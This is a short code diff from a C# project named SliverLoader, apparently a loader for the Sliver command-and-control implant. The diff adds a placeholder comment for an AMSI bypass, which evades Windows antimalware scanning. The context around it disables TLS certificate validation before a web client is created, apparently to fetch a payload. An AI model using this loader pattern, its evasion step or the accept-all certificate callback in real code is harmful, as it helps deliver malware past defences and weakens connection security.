@@ -152,6 +152,8 @@ namespace SliverLoader
                 return;
             }
 
+            // Add amsi bypass here
+
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new WebClientWithTimeout();
 
